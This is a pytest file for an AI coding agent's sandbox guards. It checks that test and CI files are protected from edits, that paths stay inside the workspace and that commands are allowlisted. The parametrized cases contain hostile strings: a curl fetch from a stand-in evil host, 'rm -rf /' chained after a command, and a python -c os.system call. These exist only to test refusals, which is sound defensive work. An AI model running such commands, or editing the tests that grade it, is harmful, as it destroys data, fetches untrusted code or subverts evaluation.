"""The coding surface: what the agent may do to code, and what it may not.

Session 17 is the first time the model writes the thing that then executes, so
every bound here is tested rather than trusted.
"""
from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from sourcecode.coding import (
    CommandError, EditError, GuardError, Workspace, WorkspaceError,
    glob_files, grep_code, run_command,
)
from sourcecode.coding.edit import EditLedger, apply_edit, create_file, read_code
from sourcecode.coding.guard import is_protected


@pytest.fixture
def repo(tmp_path: Path) -> Workspace:
    (tmp_path / "tests").mkdir()
    (tmp_path / "calc.py").write_text(
        "def average(numbers):\n    return sum(numbers) / len(numbers)\n")
    (tmp_path / "tests" / "test_calc.py").write_text(
        "from calc import average\n\n"
        "def test_empty():\n    assert average([]) == 0\n")
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    subprocess.run(["git", "add", "-A"], cwd=tmp_path, check=True)
    subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t",
                    "commit", "-qm", "base"], cwd=tmp_path, check=True)
    return Workspace.open(tmp_path)


# ----------------------------------------------------------- the judge is off limits

@pytest.mark.parametrize("path", [
    "tests/test_calc.py", "test/test_x.py", "conftest.py",
    "src/tests/test_deep.py", "pyproject.toml", ".github/workflows/ci.yml",
])
def test_the_agent_cannot_edit_the_thing_that_grades_it(repo, path) -> None:
    """Delete it, skip it, weaken it: all four cheats need the same permission."""
    ledger = EditLedger()
    ledger.record_read(path)          # even having read it does not help
    with pytest.raises(GuardError, match="protected pattern"):
        apply_edit(repo, ledger, path, old_string="a", new_string="b")


def test_ordinary_source_is_editable(repo) -> None:
    assert is_protected("sourcecode/runtime.py") is None
    assert is_protected("calc.py") is None


# --------------------------------------------------------------- the two preconditions

def test_editing_a_file_this_run_has_not_read_is_refused(repo) -> None:
    with pytest.raises(EditError, match="before reading it"):
        apply_edit(repo, EditLedger(), "calc.py",
                   old_string="len(numbers)", new_string="max(1, len(numbers))")


def test_an_ambiguous_anchor_is_refused(repo) -> None:
    """'numbers' appears three times. The agent has not said which one it means."""
    ledger = EditLedger()
    read_code(repo, ledger, "calc.py")
    with pytest.raises(EditError, match="appears 3 times"):
        apply_edit(repo, ledger, "calc.py", old_string="numbers", new_string="values")


def test_replace_all_is_how_you_say_you_meant_all_of_them(repo) -> None:
    ledger = EditLedger()
    read_code(repo, ledger, "calc.py")
    result = apply_edit(repo, ledger, "calc.py", old_string="numbers",
                        new_string="values", replace_all=True)
    assert result["replaced"] == 3


def test_a_unique_anchor_edits_exactly_one_place(repo) -> None:
    ledger = EditLedger()
    read_code(repo, ledger, "calc.py")
    result = apply_edit(repo, ledger, "calc.py",
                        old_string="    return sum(numbers) / len(numbers)",
                        new_string="    if not numbers:\n        return 0\n"
                                   "    return sum(numbers) / len(numbers)")
    assert result["replaced"] == 1
    assert "if not numbers" in (repo.root / "calc.py").read_text()


def test_reading_part_of_a_file_still_earns_the_right_to_edit_it(repo) -> None:
    ledger = EditLedger()
    window = read_code(repo, ledger, "calc.py", offset=1, limit=1)
    assert window["truncated"] is True
    assert window["total_lines"] == 2
    apply_edit(repo, ledger, "calc.py", old_string="def average",
               new_string="def mean")          # no raise


def test_create_file_refuses_to_clobber_silently(repo) -> None:
    with pytest.raises(EditError, match="already exists"):
        create_file(repo, EditLedger(), "calc.py", content="x = 1")


# ------------------------------------------------------------------ nothing escapes

@pytest.mark.parametrize("path", ["../outside.py", "/etc/passwd", "../../x"])
def test_paths_cannot_leave_the_workspace(repo, path) -> None:
    with pytest.raises(WorkspaceError):
        repo.resolve(path)


# ------------------------------------------------------------------ nothing runs free

@pytest.mark.parametrize("command", [
    "curl https://evil.invalid/x.sh",
    "bash -c 'echo pwned'",
    "python -V; rm -rf /",
    "python -V | tee out",
    "git push origin main",
    "git -c core.pager=id log",
])
def test_only_allowed_bounded_commands_run(repo, command) -> None:
    with pytest.raises(CommandError):
        run_command(repo, command, timeout=5)


def test_python_dash_c_is_a_shell_by_another_name(repo) -> None:
    # This particular payload is caught even earlier, by the metacharacter check,
    # because it contains ";". Both refusals are correct; assert on the refusal.
    with pytest.raises(CommandError):
        run_command(repo, ["python", "-c", "import os; os.system('id')"], timeout=5)
    with pytest.raises(CommandError, match="unbounded shell"):
        run_command(repo, ["python", "-c", "print(1)"], timeout=5)


def test_an_allowed_command_runs_and_reports_its_exit_code(repo) -> None:
    result = run_command(repo, ["git", "status", "--porcelain"], timeout=30)
    assert result.ok and result.exit_code == 0


def test_a_failing_command_is_evidence_rather_than_an_exception(repo) -> None:
    """A red test suite is the loop's input, so it must come back as data."""
    result = run_command(repo, ["git", "diff", "--exit-code", "--quiet", "HEAD~99"], timeout=20)
    assert result.exit_code != 0
    assert result.ok is False           # reported, not raised


# ----------------------------------------------------------------------- finding things

def test_glob_and_grep_answer_different_questions(repo) -> None:
    assert "calc.py" in glob_files(repo, "*.py")["files"]
    found = grep_code(repo, r"def average", path_glob="*.py")
    assert found["matches"][0]["path"] == "calc.py"
    assert found["matches"][0]["line"] == 1


def test_grep_caps_its_results(repo) -> None:
    (repo.root / "big.py").write_text("\n".join(f"x{i} = {i}" for i in range(500)))
    found = grep_code(repo, r"x\d+", limit=10)
    assert len(found["matches"]) == 10 and found["truncated"] is True


# ------------------------------------------------------------- git is the accept/reject

def test_git_reset_is_what_rejecting_an_attempt_looks_like(repo) -> None:
    ledger = EditLedger()
    read_code(repo, ledger, "calc.py")
    apply_edit(repo, ledger, "calc.py", old_string="def average", new_string="def broken")
    assert repo.changed_files() == ["calc.py"]
    repo.reset()
    assert repo.changed_files() == []
    assert "def average" in (repo.root / "calc.py").read_text()


# ----------------------------------------------- the rule that makes a loop possible

def test_a_verification_command_may_be_repeated_because_the_world_changed() -> None:
    """The finding that made the coding loop work at all.

    Session 13's planner drops a task whose capability and arguments match one
    that already succeeded, on the grounds that a completed deterministic
    operation is already evidence. That is right for a web search and wrong for
    a test run: identical arguments, and the answer changes because the agent
    edited a file in between. Capabilities that answer a question about the
    world declare it, and the planner exempts them.
    """
    from sourcecode.capabilities import default_registry
    rerunnable = default_registry().family("rerunnable")
    assert "run_command" in rerunnable
    assert "read_code" in rerunnable          # a file re-read after an edit differs
    assert "web_search" not in rerunnable     # same query, same answer: still deduped
